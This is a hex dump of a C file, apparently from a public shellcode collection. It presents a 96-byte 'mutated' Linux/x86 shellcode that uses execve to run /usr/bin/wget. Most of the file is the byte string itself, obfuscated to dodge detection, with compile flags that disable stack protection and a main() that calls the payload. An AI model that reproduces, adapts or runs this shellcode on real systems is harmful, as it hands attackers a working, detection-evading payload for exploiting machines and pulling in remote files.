00000000  2f 2a 0a 0a 20 20 20 4d  75 74 61 74 65 64 20 45  |/*..   Mutated E|
00000010  78 65 63 76 65 20 57 67  65 74 20 53 68 65 6c 6c  |xecve Wget Shell|
00000020  63 6f 64 65 20 2d 20 43  20 4c 61 6e 67 75 61 67  |code - C Languag|
00000030  65 20 2d 20 4c 69 6e 75  78 2f 78 38 36 0a 20 20  |e - Linux/x86.  |
00000040  20 43 6f 70 79 72 69 67  68 74 20 28 43 29 20 32  | Copyright (C) 2|
00000050  30 31 33 20 47 65 79 73  6c 61 6e 20 47 2e 20 42  |013 Geyslan G. B|
00000060  65 6d 2c 20 48 61 63 6b  69 6e 67 20 62 69 74 73  |em, Hacking bits|
00000070  0a 0a 20 20 20 68 74 74  70 3a 2f 2f 68 61 63 6b  |..   http://hack|
00000080  69 6e 67 62 69 74 73 2e  63 6f 6d 0a 20 20 20 67  |ingbits.com.   g|
00000090  65 79 73 6c 61 6e 40 67  6d 61 69 6c 2e 63 6f 6d  |eyslan@gmail.com|
000000a0  0a 0a 20 20 20 54 68 69  73 20 70 72 6f 67 72 61  |..   This progra|
000000b0  6d 20 69 73 20 66 72 65  65 20 73 6f 66 74 77 61  |m is free softwa|
000000c0  72 65 3a 20 79 6f 75 20  63 61 6e 20 72 65 64 69  |re: you can redi|
000000d0  73 74 72 69 62 75 74 65  20 69 74 20 61 6e 64 2f  |stribute it and/|
000000e0  6f 72 20 6d 6f 64 69 66  79 0a 20 20 20 69 74 20  |or modify.   it |
000000f0  75 6e 64 65 72 20 74 68  65 20 74 65 72 6d 73 20  |under the terms |
00000100  6f 66 20 74 68 65 20 47  4e 55 20 47 65 6e 65 72  |of the GNU Gener|
00000110  61 6c 20 50 75 62 6c 69  63 20 4c 69 63 65 6e 73  |al Public Licens|
00000120  65 20 61 73 20 70 75 62  6c 69 73 68 65 64 20 62  |e as published b|
00000130  79 0a 20 20 20 74 68 65  20 46 72 65 65 20 53 6f  |y.   the Free So|
00000140  66 74 77 61 72 65 20 46  6f 75 6e 64 61 74 69 6f  |ftware Foundatio|
00000150  6e 2c 20 65 69 74 68 65  72 20 76 65 72 73 69 6f  |n, either versio|
00000160  6e 20 33 20 6f 66 20 74  68 65 20 4c 69 63 65 6e  |n 3 of the Licen|
00000170  73 65 2c 20 6f 72 0a 20  20 20 28 61 74 20 79 6f  |se, or.   (at yo|
00000180  75 72 20 6f 70 74 69 6f  6e 29 20 61 6e 79 20 6c  |ur option) any l|
00000190  61 74 65 72 20 76 65 72  73 69 6f 6e 2e 0a 0a 20  |ater version... |
000001a0  20 20 54 68 69 73 20 70  72 6f 67 72 61 6d 20 69  |  This program i|
000001b0  73 20 64 69 73 74 72 69  62 75 74 65 64 20 69 6e  |s distributed in|
000001c0  20 74 68 65 20 68 6f 70  65 20 74 68 61 74 20 69  | the hope that i|
000001d0  74 20 77 69 6c 6c 20 62  65 20 75 73 65 66 75 6c  |t will be useful|
000001e0  2c 0a 20 20 20 62 75 74  20 57 49 54 48 4f 55 54  |,.   but WITHOUT|
000001f0  20 41 4e 59 20 57 41 52  52 41 4e 54 59 3b 20 77  | ANY WARRANTY; w|
00000200  69 74 68 6f 75 74 20 65  76 65 6e 20 74 68 65 20  |ithout even the |
00000210  69 6d 70 6c 69 65 64 20  77 61 72 72 61 6e 74 79  |implied warranty|
00000220  20 6f 66 0a 20 20 20 4d  45 52 43 48 41 4e 54 41  | of.   MERCHANTA|
00000230  42 49 4c 49 54 59 20 6f  72 20 46 49 54 4e 45 53  |BILITY or FITNES|
00000240  53 20 46 4f 52 20 41 20  50 41 52 54 49 43 55 4c  |S FOR A PARTICUL|
00000250  41 52 20 50 55 52 50 4f  53 45 2e 20 20 53 65 65  |AR PURPOSE.  See|
00000260  20 74 68 65 0a 20 20 20  47 4e 55 20 47 65 6e 65  | the.   GNU Gene|
00000270  72 61 6c 20 50 75 62 6c  69 63 20 4c 69 63 65 6e  |ral Public Licen|
00000280  73 65 20 66 6f 72 20 6d  6f 72 65 20 64 65 74 61  |se for more deta|
00000290  69 6c 73 2e 0a 0a 20 20  20 59 6f 75 20 73 68 6f  |ils...   You sho|
000002a0  75 6c 64 20 68 61 76 65  20 72 65 63 65 69 76 65  |uld have receive|
000002b0  64 20 61 20 63 6f 70 79  20 6f 66 20 74 68 65 20  |d a copy of the |
000002c0  47 4e 55 20 47 65 6e 65  72 61 6c 20 50 75 62 6c  |GNU General Publ|
000002d0  69 63 20 4c 69 63 65 6e  73 65 0a 20 20 20 61 6c  |ic License.   al|
000002e0  6f 6e 67 20 77 69 74 68  20 74 68 69 73 20 70 72  |ong with this pr|
000002f0  6f 67 72 61 6d 2e 20 20  49 66 20 6e 6f 74 2c 20  |ogram.  If not, |
00000300  73 65 65 20 3c 68 74 74  70 3a 2f 2f 77 77 77 2e  |see <http://www.|
00000310  67 6e 75 2e 6f 72 67 2f  6c 69 63 65 6e 73 65 73  |gnu.org/licenses|
00000320  2f 3e 2e 0a 0a 2a 2f 0a  0a 2f 2a 0a 0a 20 20 20  |/>...*/../*..   |
00000330  6d 75 74 61 74 65 64 5f  65 78 65 63 76 65 5f 77  |mutated_execve_w|
00000340  67 65 74 5f 73 68 65 6c  6c 63 6f 64 65 0a 0a 20  |get_shellcode.. |
00000350  20 20 2a 20 39 36 20 62  79 74 65 73 0a 20 20 20  |  * 96 bytes.   |
00000360  2a 20 6e 75 6c 6c 2d 66  72 65 65 0a 20 20 20 2a  |* null-free.   *|
00000370  20 6d 75 74 61 74 65 64  20 69 73 6e 27 74 20 70  | mutated isn't p|
00000380  6f 6c 79 6d 6f 72 70 68  69 63 20 28 73 68 65 6c  |olymorphic (shel|
00000390  6c 63 6f 64 65 20 64 6f  65 73 20 6e 6f 74 20 72  |lcode does not r|
000003a0  65 70 6c 69 63 61 74 65  20 69 74 73 65 6c 66 20  |eplicate itself |
000003b0  74 6f 20 62 65 20 63 61  6c 6c 65 64 20 70 6f 6c  |to be called pol|
000003c0  79 6d 6f 72 70 68 69 63  29 0a 0a 0a 20 20 23 20  |ymorphic)...  # |
000003d0  67 63 63 20 2d 6d 33 32  20 2d 66 6e 6f 2d 73 74  |gcc -m32 -fno-st|
000003e0  61 63 6b 2d 70 72 6f 74  65 63 74 6f 72 20 2d 7a  |ack-protector -z|
000003f0  20 65 78 65 63 73 74 61  63 6b 20 6d 75 74 61 74  | execstack mutat|
00000400  65 64 5f 65 78 65 63 76  65 5f 77 67 65 74 5f 73  |ed_execve_wget_s|
00000410  68 65 6c 6c 63 6f 64 65  2e 63 20 2d 6f 20 6d 75  |hellcode.c -o mu|
00000420  74 61 74 65 64 5f 65 78  65 63 76 65 5f 77 67 65  |tated_execve_wge|
00000430  74 5f 73 68 65 6c 6c 63  6f 64 65 0a 0a 20 20 54  |t_shellcode..  T|
00000440  65 73 74 69 6e 67 0a 20  20 23 20 2e 2f 6d 75 74  |esting.  # ./mut|
00000450  61 74 65 64 5f 65 78 65  63 76 65 5f 77 67 65 74  |ated_execve_wget|
00000460  5f 73 68 65 6c 6c 63 6f  64 65 0a 0a 2a 2f 0a 0a  |_shellcode..*/..|
00000470  0a 23 69 6e 63 6c 75 64  65 20 3c 73 74 64 69 6f  |.#include <stdio|
00000480  2e 68 3e 0a 23 69 6e 63  6c 75 64 65 20 3c 73 74  |.h>.#include <st|
00000490  72 69 6e 67 2e 68 3e 0a  0a 75 6e 73 69 67 6e 65  |ring.h>..unsigne|
000004a0  64 20 63 68 61 72 20 73  68 65 6c 6c 63 6f 64 65  |d char shellcode|
000004b0  5b 5d 20 3d 20 5c 0a 0a  20 20 20 20 20 20 20 20  |[] = \..        |
000004c0  20 20 20 20 20 20 22 5c  78 65 62 5c 78 30 31 5c  |      "\xeb\x01\|
000004d0  78 65 38 5c 78 32 39 5c  78 64 62 5c 78 37 34 5c  |xe8\x29\xdb\x74\|
000004e0  78 30 31 5c 78 38 33 5c  78 66 37 5c 78 65 33 22  |x01\x83\xf7\xe3"|
000004f0  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 22  |.              "|
00000500  5c 78 62 64 5c 78 66 35  5c 78 66 66 5c 78 66 66  |\xbd\xf5\xff\xff|
00000510  5c 78 66 66 5c 78 65 62  5c 78 30 31 5c 78 65 38  |\xff\xeb\x01\xe8|
00000520  5c 78 36 38 5c 78 34 31  22 0a 20 20 20 20 20 20  |\x68\x41".      |
00000530  20 20 20 20 20 20 20 20  22 5c 78 36 35 5c 78 34  |        "\x65\x4|
00000540  35 5c 78 37 32 5c 78 32  39 5c 78 66 36 5c 78 37  |5\x72\x29\xf6\x7|
00000550  34 5c 78 30 31 5c 78 38  33 5c 78 35 65 5c 78 35  |4\x01\x83\x5e\x5|
00000560  36 22 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |6".             |
00000570  20 22 5c 78 38 31 5c 78  66 36 5c 78 32 35 5c 78  | "\x81\xf6\x25\x|
00000580  34 61 5c 78 31 66 5c 78  33 65 5c 78 35 36 5c 78  |4a\x1f\x3e\x56\x|
00000590  65 62 5c 78 30 31 5c 78  33 33 22 0a 20 20 20 20  |eb\x01\x33".    |
000005a0  20 20 20 20 20 20 20 20  20 20 22 5c 78 36 38 5c  |          "\x68\|
000005b0  78 36 39 5c 78 37 33 5c  78 32 65 5c 78 36 37 5c  |x69\x73\x2e\x67\|
000005c0  78 38 39 5c 78 34 34 5c  78 32 34 5c 78 30 63 5c  |x89\x44\x24\x0c\|
000005d0  78 38 39 22 0a 20 20 20  20 20 20 20 20 20 20 20  |x89".           |
000005e0  20 20 20 22 5c 78 65 31  5c 78 36 61 5c 78 37 34  |   "\xe1\x6a\x74|
000005f0  5c 78 65 62 5c 78 30 31  5c 78 65 33 5c 78 36 38  |\xeb\x01\xe3\x68|
00000600  5c 78 32 66 5c 78 37 37  5c 78 36 37 22 0a 20 20  |\x2f\x77\x67".  |
00000610  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 36  |            "\x6|
00000620  35 5c 78 65 62 5c 78 30  31 5c 78 38 33 5c 78 36  |5\xeb\x01\x83\x6|
00000630  38 5c 78 32 66 5c 78 36  32 5c 78 36 39 5c 78 36  |8\x2f\x62\x69\x6|
00000640  65 5c 78 65 62 22 0a 20  20 20 20 20 20 20 20 20  |e\xeb".         |
00000650  20 20 20 20 20 22 5c 78  30 31 5c 78 33 33 5c 78  |     "\x01\x33\x|
00000660  36 38 5c 78 32 66 5c 78  37 35 5c 78 37 33 5c 78  |68\x2f\x75\x73\x|
00000670  37 32 5c 78 38 64 5c 78  31 63 5c 78 32 34 22 0a  |72\x8d\x1c\x24".|
00000680  20 20 20 20 20 20 20 20  20 20 20 20 20 20 22 5c  |              "\|
00000690  78 65 62 5c 78 30 31 5c  78 38 33 5c 78 35 30 5c  |xeb\x01\x83\x50\|
000006a0  78 35 31 5c 78 35 33 5c  78 38 39 5c 78 65 31 5c  |x51\x53\x89\xe1\|
000006b0  78 66 37 5c 78 64 64 22  0a 20 20 20 20 20 20 20  |xf7\xdd".       |
000006c0  20 20 20 20 20 20 20 22  5c 78 39 35 5c 78 65 62  |       "\x95\xeb|
000006d0  5c 78 30 31 5c 78 38 33  5c 78 63 64 5c 78 38 30  |\x01\x83\xcd\x80|
000006e0  22 3b 0a 0a 0a 6d 61 69  6e 20 28 29 0a 7b 0a 0a  |";...main ().{..|
000006f0  20 20 20 20 2f 2f 20 57  68 65 6e 20 63 6f 6e 74  |    // When cont|
00000700  61 69 6e 73 20 6e 75 6c  6c 20 62 79 74 65 73 2c  |ains null bytes,|
00000710  20 70 72 69 6e 74 66 20  77 69 6c 6c 20 73 68 6f  | printf will sho|
00000720  77 20 61 20 77 72 6f 6e  67 20 73 68 65 6c 6c 63  |w a wrong shellc|
00000730  6f 64 65 20 6c 65 6e 67  74 68 2e 0a 0a 20 20 20  |ode length...   |
00000740  20 70 72 69 6e 74 66 28  22 53 68 65 6c 6c 63 6f  | printf("Shellco|
00000750  64 65 20 4c 65 6e 67 74  68 3a 20 20 25 64 5c 6e  |de Length:  %d\n|
00000760  22 2c 20 73 74 72 6c 65  6e 28 73 68 65 6c 6c 63  |", strlen(shellc|
00000770  6f 64 65 29 29 3b 0a 0a  20 20 20 20 2f 2f 20 50  |ode));..    // P|
00000780  6f 6c 6c 75 74 65 73 20  61 6c 6c 20 72 65 67 69  |ollutes all regi|
00000790  73 74 65 72 73 20 65 6e  73 75 72 69 6e 67 20 74  |sters ensuring t|
000007a0  68 61 74 20 74 68 65 20  73 68 65 6c 6c 63 6f 64  |hat the shellcod|
000007b0  65 20 72 75 6e 73 20 69  6e 20 61 6e 79 20 63 69  |e runs in any ci|
000007c0  72 63 75 6d 73 74 61 6e  63 65 2e 0a 0a 20 20 20  |rcumstance...   |
000007d0  20 5f 5f 61 73 6d 5f 5f  20 28 22 6d 6f 76 6c 20  | __asm__ ("movl |
000007e0  24 30 78 66 66 66 66 66  66 66 66 2c 20 25 65 61  |$0xffffffff, %ea|
000007f0  78 5c 6e 5c 74 22 0a 20  20 20 20 20 20 20 20 20  |x\n\t".         |
00000800  20 20 20 22 6d 6f 76 6c  20 25 65 61 78 2c 20 25  |   "movl %eax, %|
00000810  65 62 78 5c 6e 5c 74 22  0a 20 20 20 20 20 20 20  |ebx\n\t".       |
00000820  20 20 20 20 20 22 6d 6f  76 6c 20 25 65 61 78 2c  |     "movl %eax,|
00000830  20 25 65 63 78 5c 6e 5c  74 22 0a 20 20 20 20 20  | %ecx\n\t".     |
00000840  20 20 20 20 20 20 20 22  6d 6f 76 6c 20 25 65 61  |       "movl %ea|
00000850  78 2c 20 25 65 64 78 5c  6e 5c 74 22 0a 20 20 20  |x, %edx\n\t".   |
00000860  20 20 20 20 20 20 20 20  20 22 6d 6f 76 6c 20 25  |         "movl %|
00000870  65 61 78 2c 20 25 65 73  69 5c 6e 5c 74 22 0a 20  |eax, %esi\n\t". |
00000880  20 20 20 20 20 20 20 20  20 20 20 22 6d 6f 76 6c  |           "movl|
00000890  20 25 65 61 78 2c 20 25  65 64 69 5c 6e 5c 74 22  | %eax, %edi\n\t"|
000008a0  0a 20 20 20 20 20 20 20  20 20 20 20 20 22 6d 6f  |.            "mo|
000008b0  76 6c 20 25 65 61 78 2c  20 25 65 62 70 5c 6e 5c  |vl %eax, %ebp\n\|
000008c0  74 22 0a 0a 20 20 20 20  20 20 20 20 20 20 20 20  |t"..            |
000008d0  2f 2f 20 43 61 6c 6c 69  6e 67 20 74 68 65 20 73  |// Calling the s|
000008e0  68 65 6c 6c 63 6f 64 65  0a 20 20 20 20 20 20 20  |hellcode.       |
000008f0  20 20 20 20 20 22 63 61  6c 6c 20 73 68 65 6c 6c  |     "call shell|
00000900  63 6f 64 65 22 29 3b 0a  0a 7d                    |code");..}|
0000090a
